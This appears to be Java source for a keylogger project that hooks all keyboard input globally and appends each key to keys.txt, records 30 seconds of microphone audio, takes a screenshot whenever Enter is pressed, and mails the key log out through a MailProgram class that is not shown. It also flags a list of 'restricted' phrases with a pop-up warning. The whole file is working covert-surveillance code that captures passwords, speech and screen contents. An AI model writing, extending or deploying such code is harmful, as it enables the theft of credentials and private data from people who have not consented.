package com.example.Java_keylogger;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.security.Key;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.TargetDataLine;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;

//import org.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.sound.sampled.*;
import java.io.*;
import javax.sound.sampled.*;
import java.io.*;

public class KeyLogger implements NativeKeyListener {
	private static final Path file= Paths.get("keys.txt");
	TargetDataLine Audiodata;
	int i=0;
	String word = null;
	int count=0;
	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
	public static void main(String[] args) {
		logger.info("please type something check it in the bin/keys ");
		init();
		try {
		//	System.setProperty("jnativehook.disable.auto.repeat.rate", "true");
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
		KeyLogger kl21=new KeyLogger();
		kl21.recordstart();
	}

	private static void init() {
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);
		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String data = NativeKeyEvent.getKeyText(e.getKeyCode());
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,StandardOpenOption.APPEND); 
				
				PrintWriter writer = new PrintWriter(os)) {		
				writer.print(  data );	
				
		} 
		catch (IOException ex) {
			logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}		
	public int recordstart() {
		try {
			 boolean bigEndian = true;
			DataLine.Info parameters = new DataLine.Info(TargetDataLine.class, new AudioFormat( AudioFormat.Encoding.PCM_SIGNED, 44100.0f, 16, 2, 4, 44100.0f, bigEndian));
			if (!AudioSystem.isLineSupported(parameters)) {
				System.out.println("audio not suitable for given parameters");
				System.exit(0);
			}
			Audiodata = (TargetDataLine) AudioSystem.getLine(parameters);
			Audiodata.open(new AudioFormat( AudioFormat.Encoding.PCM_SIGNED, 44100.0f, 16, 2, 4, 44100.0f, bigEndian), Audiodata.getBufferSize());
			Audiodata.start();	
			System.out.println("Audio capturing statred  ...");
			recordstop stop=new recordstop();
			stop.start();
			AudioSystem.write(new AudioInputStream(Audiodata), AudioFileFormat.Type.AU, new File("capturedaudio.au"));
			Audiodata.stop();
			Audiodata.close();
			
		}
		 catch (LineUnavailableException ex) {
			ex.printStackTrace();
		} catch (IOException ioe) {
			ioe.printStackTrace();
		}
		return 0;
	
		}
		
	public void nativeKeyReleased(NativeKeyEvent e) {
			String Key=NativeKeyEvent.getKeyText(e.getKeyCode());
			String str[]=new String[100];
			if(!Key.equals("null")) {
			str[i]=Key;
			//System.out.printf("string is %s",str[i]);
			if(!Key.equals("Enter")) {
			if((i==0)&&(!str[i].equals("Backspace"))) {
			word=str[i];
			//System.out.println("word is"+word+i);	
			}
			else if(str[i].equals("Space"))
				word=word.concat(" ");
			
			else {
			word=word.concat(str[i]);
            //System.out.println("word is"+word+i);			
			}
			}
			
			if(Key.equals("Enter")){
				
				System.out.println("enter was pressed"+"word is "+word);
				if(word.equals("SHADY DEALS")) {
						System.out.println("Restricted word has been used");
						RestrictedWord();
						count++;
				}
				if(word.equals("BOOTLEG MARKET")) {
					System.out.println("Restricted word has been used");	
					RestrictedWord();
					count++;
			}
				if(word.equals("ILLEGAL SALES")) {
					System.out.println("Restricted word has been used");
					RestrictedWord();
					count++;
			}
				if(word.equals("UNDERGROUND")) {
					System.out.println("Restricted word has been used");
					RestrictedWord();
					count++;
			}
				if(word.equals("UNDERWORLD MARKET")) {
					System.out.println("Restricted word has been used");
					RestrictedWord();
					count++;
			}
				if(word.equals("GRAY MARKET")) {
					System.out.println("Restricted word has been used");
					RestrictedWord();
					count++;
			}
				if(word.equals("ILLEGTIMATE")) {
					System.out.println("Restricted word has been used");
					RestrictedWord();
					count++;
			}
				if(word.equals("CRIME")) {
					System.out.println("Restricted word has been used");	
					RestrictedWord();
					count++;
			}
				if(word.equals("TERROR")) {
					System.out.println("Restricted word has been used");
					RestrictedWord();
					count++;
			}
				count=1;	
				}
			
		i++;
		
		if(count==1) {
			word=null;	
			i=0;
			count=0;
			}
			}
		if(Key.equals("Enter")) {		
					IMAGECAPTURE();
						mailsend();
					}	

		}
		
	public static void mailsend() {
		try {
			MailProgram.sendMail(file);	
		}
		catch(Throwable e1) {
			e1.printStackTrace();
		}
	}
	
	public void nativeKeyTyped(NativeKeyEvent e) {  
			
	}

	public static void RestrictedWord() {
		 JFrame f = new JFrame("RESTRICTED WORDS ");
		    f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		    f.getContentPane().add("Center",new JTextField("Restricted word Has been used . An Unauthorized activity has been detected"));
		    f.pack();
		    Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		    f.setLocation(screenSize.width / 2 -250, screenSize.height / 2 -75);
		    f.setSize(500,150);
		    f.show();
		
		
	}
    public static void IMAGECAPTURE() {
    	 try { 
    		 GraphicsDevice[] capture = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
    		    BufferedImage CONSOLECAPTURE = new Robot().createScreenCapture(new Rectangle(300, 450, 1000, 250));
    		   File file=new File("targetscreens.png");
    		    ImageIO.write(CONSOLECAPTURE, "png",file);  
    		    BufferedImage myPicture = ImageIO.read(file);
    		 Graphics2D g = (Graphics2D)  myPicture.getGraphics();
    		 g.drawRect(300, 450, 1000,250);
    		JFrame f = new JFrame();
    		f.setSize(new Dimension(1000, 250));
    		f.add(new JPanel().add(new JLabel(new ImageIcon(myPicture))));
    		f.setVisible(true);
    		System.out.println("IMAGE CAPTURED");
    		 
     }
    	 catch (AWTException | IOException ex) {
             System.out.println(ex.getMessage());
         }
}
    class recordstop extends Thread {
		public void run() {
			try {
				Thread.sleep(30000);
				System.out.println("Recording completed");
			} catch (InterruptedException ex) {
				ex.printStackTrace();
			}
			System.out.println("recording captured");
		}	
}
  
}
